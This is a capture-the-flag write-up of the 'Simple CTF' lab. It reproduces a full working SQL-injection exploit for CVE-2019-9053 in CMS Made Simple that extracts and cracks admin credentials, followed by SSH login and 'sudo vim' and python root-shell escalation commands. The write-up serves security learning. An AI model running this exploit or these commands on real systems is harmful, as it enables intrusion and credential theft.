<h1 align="center"> Simple CTF </h1>

<img width="1323" height="186" alt="image" src="https://github.com/user-attachments/assets/01ade0f1-70a6-4bb0-940f-74b4b496f34d" />




## Start Lab:
<img width="822" height="616" alt="image" src="https://github.com/user-attachments/assets/06cb6830-f0b3-4864-920b-a60c9ccddb81" />


This our what we will find:

<img width="814" height="789" alt="image" src="https://github.com/user-attachments/assets/7f0b3d65-091c-41b2-8d71-30b9c0e7da75" />


## Start Machine
After start machine now i see my target have IP `10.48.186.93`:
<img width="810" height="491" alt="image" src="https://github.com/user-attachments/assets/3c789788-1f34-4f43-b62b-b42c2bbc5886" />


In this i do this lab with my KALI Linux, and then i open my `OpenVPN`:
<img width="552" height="378" alt="image" src="https://github.com/user-attachments/assets/3a2b8e2b-3df1-4795-93a9-9b7cd41d3439" />

And then on KalI
````
cd Desktop
ls
cd THM
ls
sudo openvpn eu-west-1-HelloHello89-regular.ovpn 
````
<img width="1440" height="844" alt="image" src="https://github.com/user-attachments/assets/63488460-358b-4bda-9737-6d7735595bf2" />

After open one more `Terminal`, just press `Ctrl + Shift + T`:
````
mkdir simple-ctf
cd simple-ctf
````
<img width="555" height="212" alt="image" src="https://github.com/user-attachments/assets/48309a18-1a49-429a-8425-f7db7b6f3c7e" />

After verify to target machine:
````
ping 10.48.186.93
````
<img width="653" height="302" alt="image" src="https://github.com/user-attachments/assets/c62abd2a-12a6-4f5a-b29a-ae5ec097c337" />


---


# Task 1
<img width="810" height="794" alt="image" src="https://github.com/user-attachments/assets/77611e4c-f32b-4a64-9ed7-0d23c47a106d" />

## Question 1:
How many services are running under port 1000?
<img width="1084" height="93" alt="image" src="https://github.com/user-attachments/assets/977327ef-a7ee-4ee0-94d7-43b30cc5c355" />

- Scan target:
````
nmap 10.48.186.93 -sVC -Pn -T4 -oN first.txt
````
<img width="968" height="787" alt="image" src="https://github.com/user-attachments/assets/66e68019-d9f7-41cc-af8b-23ad9013b3fe" />

After we wait it to scan afew minute, Now we got the result. 

So in this `services are running under port 1000` have `2`
1. 21/tcp   open  ftp     vsftpd 3.0.3
2. 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))

And why not `2222`? -> Cause it over `1000` service.

- Now we found the correct answer is:
````
2
````
<img width="1053" height="87" alt="image" src="https://github.com/user-attachments/assets/46dc4cbb-c648-4eab-a21e-9e1d3901fda3" />

---

## Question 2:
What is running on the higher port?
<img width="1043" height="90" alt="image" src="https://github.com/user-attachments/assets/fcdf0463-65d7-4fc8-aa76-6472379fb9d1" />

Base on our result that we scan above:
<img width="973" height="788" alt="image" src="https://github.com/user-attachments/assets/78e24978-a3be-4cd1-b23f-0848e2578cf7" />

Now we found the service `is running on the higher port` is `ssh`.

So the correct answer is:
````
ssh
````
<img width="1057" height="94" alt="image" src="https://github.com/user-attachments/assets/c0d3669e-36c2-4c3c-a76b-81dbb882c82c" />

---


## Question 3:
What's the CVE you're using against the application?
<img width="1054" height="95" alt="image" src="https://github.com/user-attachments/assets/47603a96-3ce4-4876-b2a6-3a69c2a5968f" />

In this i go to browser and type the target IP, cause it open port `80`:
````
http://10.48.186.93/
````
<img width="1342" height="860" alt="image" src="https://github.com/user-attachments/assets/507ec903-2a95-432e-87b8-4543737437fd" />

Now we after i input this to browser and then i see `Apache 2` service.

After back to our `Terminal` and in this i use `Gobuster`:
````
gobuster dir -u http://10.48.186.93/ -w /usr/share/wordlists/dirb/common.txt
````
<img width="1059" height="676" alt="image" src="https://github.com/user-attachments/assets/f830a08a-12e9-4946-b07a-b29a2afb59d9" />


### What we found & What It Means
| Path / File  | Status Code | Significance                                                                                                     |
| ------------ | ----------- | ---------------------------------------------------------------------------------------------------------------- |
| `robots.txt` | 200         | ⚠️ Check this first – often reveals hidden paths or disallowed directories that may contain interesting content. |
| `simple/`    | 301         | 🎯 Redirects to the vulnerable CMS Made Simple application. Likely the main target.                              |
| `.htaccess`  | 403         | Normal – Apache configuration file. Access is forbidden. Usually not directly exploitable.                       |
| `.htpasswd`  | 403         | Normal – Stores authentication credentials for Apache. Access blocked. Ignore for now.                           |

After we finished scan, and then check:
````
http://10.48.186.93/robots.txt
````
<img width="965" height="654" alt="image" src="https://github.com/user-attachments/assets/635d057f-ebdc-47e4-83df-11c161c07028" />

Key finding:
````
Disallow: /openemr-5_0_1_3
````
- After Check the discovered directory:
````
curl -L http://10.48.186.93/openemr-5_0_1_3/
````
<img width="772" height="235" alt="image" src="https://github.com/user-attachments/assets/ea00c1ba-3cc1-4386-b08b-0bbbe245a0a9" />


- Search for OpenEMR vulnerabilities:
````
searchsploit openemr
````
or
````
searchsploit openemr 5.0.1.3
````
<img width="766" height="392" alt="image" src="https://github.com/user-attachments/assets/4cff9ef0-c762-49ac-a5d1-2f481960610d" />
But in this we not found only `403`.



- And check our:
````
http://10.48.186.93/simple/
````
<img width="1345" height="857" alt="image" src="https://github.com/user-attachments/assets/9310ee3a-8a38-4378-a882-8600e91a1b3e" />

Now we see this and i want to see this source code, `Right-Click` -> `View Source Code`:
<img width="1917" height="857" alt="image" src="https://github.com/user-attachments/assets/33a85f45-5cfb-4a30-8e32-ea78b45732c3" />

Now i see `CMS Made Simple`, After go back to our `Terminal`, and then use `Google Hacking Database` go to: https://www.exploit-db.com/
<img width="1858" height="1016" alt="image" src="https://github.com/user-attachments/assets/22686a76-1d01-4cfe-972f-3905d83c0cd5" />

After click on it:
<img width="1768" height="972" alt="image" src="https://github.com/user-attachments/assets/b269730d-ae37-4e56-acc3-7bf424498eb0" />

Now we see the `CVE` is `CVE-2019-9053`.

So the correct answer is:
````
CVE-2019-9053
````
<img width="1047" height="87" alt="image" src="https://github.com/user-attachments/assets/039340ab-6336-46f8-b3f0-5c66bd971c7d" />

---


## Question 4:
To what kind of vulnerability is the application vulnerable?
<img width="1052" height="87" alt="image" src="https://github.com/user-attachments/assets/55249522-4493-48c5-97da-f815f59e0725" />

Base on what we found above now we get the `kind of vulnerability is the application vulnerable` is `SQL Injection`.

So the correct answer is:
````
sqli
````
<img width="1048" height="88" alt="image" src="https://github.com/user-attachments/assets/d8564880-714c-41af-b0bd-ea25ace9f13f" />

---

## Question 5
What's the password?
<img width="1056" height="85" alt="image" src="https://github.com/user-attachments/assets/57614306-54cf-4665-b48e-4f545cf1a550" />

First go back to our `CVE` script, After `Download` it:
<img width="1792" height="780" alt="image" src="https://github.com/user-attachments/assets/3938b632-2c93-4875-bdf6-b71a2abb1100" />

Now we finished:
<img width="544" height="153" alt="image" src="https://github.com/user-attachments/assets/f782e733-e477-4a44-9fe8-bf583f1773e8" />

After open our `New One Terminal`:
<img width="1547" height="92" alt="image" src="https://github.com/user-attachments/assets/f6e4c06c-956d-4958-8fdd-d39145df5193" />

After `Move` this to our lab folder:
````
mv /home/k4n0ng/Downloads/46635.py /home/k4n0ng/Desktop/THM/simple-ctf
````
<img width="625" height="105" alt="image" src="https://github.com/user-attachments/assets/dc6e9c4c-b693-4fd0-b41b-01a650369048" />

````
ls /home/k4n0ng/Desktop/THM/simple-ctf
````
<img width="396" height="71" alt="image" src="https://github.com/user-attachments/assets/8efc2e14-0c47-4c96-9877-d7e960f1fff9" />

After go back to target browser:
````
http://10.48.163.99/simple
````
<img width="1451" height="850" alt="image" src="https://github.com/user-attachments/assets/729235d1-ad46-4345-9a1c-308055cc764f" />

> In this I was close my machine before and I open it again so my IP target has been change.

After start ``brute force``:

- In this I used wordlist `Rockyou`:
<img width="1380" height="147" alt="image" src="https://github.com/user-attachments/assets/2f13cada-bc1c-46a5-8203-ed5b03ffd5bf" />

IF error like:
<img width="713" height="175" alt="image" src="https://github.com/user-attachments/assets/d6c9b9e1-fe26-480a-ae2d-21c9ae4a5c3a" />

After change code:
````
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
import time
import optparse
import hashlib
import sys

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print "[+] Specify an url target"
    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        print_try(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()

def print_try(value):
    global output
    clear_screen()
    print output
    print '[*] Try: ' + value

def clear_screen():
    # Clear screen command for different OS
    import os
    os.system('clear')  # For Linux/Mac
    # os.system('cls')  # For Windows - uncomment if on Windows

def print_output():
    global output
    clear_screen()
    print output

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print "[*] Now try to crack password"
    crack_password()

print_output()
````
````
python2 46635.py -u http://10.48.163.99/simple -c -w /usr/share/wordlists/rockyou.txt
````
<img width="784" height="136" alt="image" src="https://github.com/user-attachments/assets/8a5accc6-ee24-4d0a-b37f-f6fa3275a859" />

Now it start brute force:
<img width="502" height="167" alt="image" src="https://github.com/user-attachments/assets/f1deaa7d-c8b4-45e7-99a4-2d7d4405b87c" />

Now we was found the correct password `secret`:
````
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
````

So the correct passsword is:
````
secret
````
<img width="911" height="91" alt="image" src="https://github.com/user-attachments/assets/35be8658-977e-47ad-bec4-0776cdb0bc4e" />

---



## Question 6:
Where can you login with the details obtained?
<img width="909" height="89" alt="image" src="https://github.com/user-attachments/assets/2a121354-af63-492b-9d57-943891a958b5" />

After we found the correct password above:
````
[+] Username found: mitch
[+] Password cracked: secret
````
After login:
````
ssh mitch@10.48.163.99 -p 2222
````
<img width="793" height="373" alt="image" src="https://github.com/user-attachments/assets/063dd3c7-f393-4f4f-91b8-8625253d32e9" />

Now we found the login with the details obtained:
````
ssh
````
<img width="921" height="87" alt="image" src="https://github.com/user-attachments/assets/4956b470-f3e3-4dd3-a018-996a55b6d905" />

---



## Question 7:

After we was successful to login. And then chack:
````
pwd
ls
cat user.txt
````
<img width="523" height="177" alt="image" src="https://github.com/user-attachments/assets/256f063e-475e-4761-94e0-6b1d5f143be0" />

Now we found the user flag:
````
G00d j0b, keep up!
````
<img width="919" height="96" alt="image" src="https://github.com/user-attachments/assets/722087fc-c0f7-4267-affc-f6092affa43f" />

---


## Question 8:

Is there any other user in the home directory? What's its name?

<img width="920" height="92" alt="image" src="https://github.com/user-attachments/assets/253403b6-f9ce-4966-b044-af8622d05ece" />

After go to `home` directory:
````
cd /home
ls
````
<img width="242" height="100" alt="image" src="https://github.com/user-attachments/assets/631d762c-e7fd-4bff-8521-0ada4499c566" />

Now we found the other user:
````
sunbath
````
<img width="913" height="97" alt="image" src="https://github.com/user-attachments/assets/b2d6f243-7040-4bf2-b602-92d0f2f4a776" />


---


## Question 9:
What can you leverage to spawn a privileged shell?
<img width="912" height="87" alt="image" src="https://github.com/user-attachments/assets/ce742c3f-11ad-4307-9635-d4cde069a38e" />

After
````
sudo -l
````
<img width="452" height="101" alt="image" src="https://github.com/user-attachments/assets/6f4a3a35-2df8-4c21-b501-ee70f44da2ab" />

````
sudo vim -c '!sh'
````
````
sudo -l
id
````
<img width="465" height="167" alt="image" src="https://github.com/user-attachments/assets/b3d3be35-53c1-4e92-b172-958999175819" />

Now we got `root`.

OR we can use:
````
sudo python -c 'import pty;pty.spawn("/bin/bash")'
````

Now we see the leverage to spawn a privileged shell is:
````
vim
````
<img width="1067" height="97" alt="image" src="https://github.com/user-attachments/assets/b383e749-0af2-4df5-80dd-a81adeb37088" />

---


## Question 10:
After we got root and then go to folder root:
````
cd /root
ls
cat root.txt
````
<img width="291" height="146" alt="image" src="https://github.com/user-attachments/assets/f6c5ebce-6eae-4da0-8cff-99d533a29b26" />

Now we got the root flag:
````
W3ll d0n3. You made it!
````
<img width="1068" height="97" alt="image" src="https://github.com/user-attachments/assets/4f43651b-1f2d-42fa-89b0-e9698a7f6231" />

---

## Full Solutions
<img width="812" height="790" alt="image" src="https://github.com/user-attachments/assets/ff35f334-0573-40ac-88be-dd85fddb7270" />

---


Now we got the successful to sovle **SimpleCTF Lab**:
<img width="1039" height="658" alt="image" src="https://github.com/user-attachments/assets/da644e2e-a0f6-4c9a-af33-96146e1dd7a9" />

<img width="870" height="599" alt="image" src="https://github.com/user-attachments/assets/5e5e1280-5b5b-439b-8087-1254e811ff11" />

---

<h2 align="center "> Complete - SimpleCTF </h2>


<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong">@k4n0ng</a>). All rights reserved.
</h2>

